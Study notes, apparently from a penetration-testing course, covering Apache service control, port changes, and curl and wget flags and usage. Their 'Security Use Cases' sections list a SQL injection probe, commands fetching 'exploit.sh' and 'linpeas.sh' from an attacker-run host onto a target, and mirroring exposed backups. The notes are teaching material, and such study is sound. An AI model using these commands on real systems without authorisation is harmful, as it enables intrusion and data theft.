# Working with Web Services

## Apache Control Commands
```bash
sudo systemctl start apache2
sudo apache2ctl start          # alternative, Apache's own control tool
sudo apache2ctl restart
sudo apache2ctl stop
```

## Apache Modules (Extending Functionality)
| Module | Purpose |
|--------|---------|
| mod_ssl | encrypts browser-server communication |
| mod_proxy | directs requests, used for proxy servers |
| mod_headers | modify HTTP headers on the fly |
| mod_rewrite | modify URLs on the fly |

## Server-Side Scripting Languages Apache Supports
PHP, Perl, Ruby, Python, JavaScript, Lua, .NET

---

## Changing Apache's Port
Config file: /etc/apache2/ports.conf
```apache
Listen 8080
```
```bash
sudo systemctl restart apache2
curl -I http://localhost:8080
```
> Useful when port 80 is already occupied (common on Pwnbox)

---

## curl -I — Quick Server Check
```bash
curl -I http://localhost:8080
```
`-I` = headers only, no body — quick way to check if server is up
`Server:` header often reveals software/version — useful recon

---

## curl — Complete Reference

### What It Is
Transfers data to/from a server using HTTP, HTTPS, FTP, SFTP, SCP, etc.
Prints output to terminal (STDOUT) by default.

### Common Flags
| Flag | Meaning |
|------|---------|
| -I | headers only |
| -i | headers AND body |
| -o file | save output as specific filename |
| -O | save with remote file's original name |
| -s | silent — no progress bar/errors |
| -v | verbose — full request/response details |
| -X | specify HTTP method (GET, POST, PUT, DELETE) |
| -d | send data (POST requests) |
| -H | add custom header |
| -L | follow redirects |
| -u | username:password for auth |
| -k | ignore SSL certificate errors |
| -A | set custom User-Agent |

### Examples
```bash
curl -I https://example.com                  # headers only
curl -o page.html https://example.com         # save as page.html
curl -O https://example.com/file.zip          # save with original name
curl -s https://example.com                   # silent mode
curl -L https://example.com                   # follow redirects
curl -k https://self-signed-site.com          # ignore cert errors
curl -v https://example.com                   # see full request/response
```

### POST Requests
```bash
curl -X POST -d "username=admin&password=test" http://target.com/login
```

### Custom Headers & Auth
```bash
curl -H "Authorization: Bearer TOKEN123" https://api.example.com
curl -u admin:password https://example.com/admin
```

### Security Use Cases
```bash
curl -I https://target.com                              # fingerprint server
curl "http://target.com/page?id=1' OR '1'='1"           # test injection
curl http://your-ip:8000/exploit.sh -o exploit.sh        # download payload
curl -X DELETE https://api.target.com/users/1            # test API methods
curl -L -v https://target.com                            # check redirect chains
```

---

## wget — Complete Reference

### What It Is
Download manager — fetches files from HTTP/HTTPS/FTP and SAVES locally.

### Common Flags
| Flag | Meaning |
|------|---------|
| -O | custom filename |
| -q | quiet mode |
| -c | resume interrupted download |
| -r | recursive — download entire directory/site |
| -P | specify download directory |
| --limit-rate | throttle download speed |
| -b | run in background |
| --no-check-certificate | ignore SSL errors |

### Examples
```bash
wget -O myfile.zip http://example.com/file.zip
wget -q http://example.com/file.zip
wget -c http://example.com/largefile.iso
wget -r http://example.com/files/
wget -P /tmp/downloads http://example.com/file.zip
wget -b http://example.com/largefile.iso
```

### Recursive Mirror
```bash
wget -r -np -k http://target.com
```
-r = recursive
-np = no parent — stay within starting directory
-k = convert links for local viewing
> Useful for grabbing exposed directory listings during a pentest

### Security Use Cases
```bash
wget http://your-ip:8000/linpeas.sh             # download tool to target
wget -r http://target.com/backups/              # mirror exposed directory
wget -q http://target.com/file -O output.txt    # quiet download in scripts
```

---

## curl vs wget — Comparison
| | curl | wget |
|---|------|------|
| Purpose | transfer/inspect data | download and save files |
| Default output | terminal (STDOUT) | saves to disk |
| Protocols | HTTP, HTTPS, FTP, SFTP, SCP+ | HTTP, HTTPS, FTP |
| POST/custom data | Yes, easily | Limited |
| Recursive download | No | Yes (-r) |
| Resume downloads | Limited | Yes (-c) |
| Best for | APIs, scripting, inspecting | bulk downloads, mirroring |

### When to Use Which
| Situation | Tool |
|-----------|------|
| Check server headers/fingerprint | curl |
| Send POST request to API | curl |
| Download single file quickly | wget or curl -O |
| Mirror entire website/directory | wget -r |
| Resume interrupted large download | wget -c |
| Inspect raw HTTP response | curl -v |
| Download payload to target | either |

---

## Python Web Server — Watching Live Requests
```bash
python3 -m http.server
```
Logs every request live:

Previous:
[[Day -11 Network Services]]

Next:
[[Day -13 Backup and Restore]]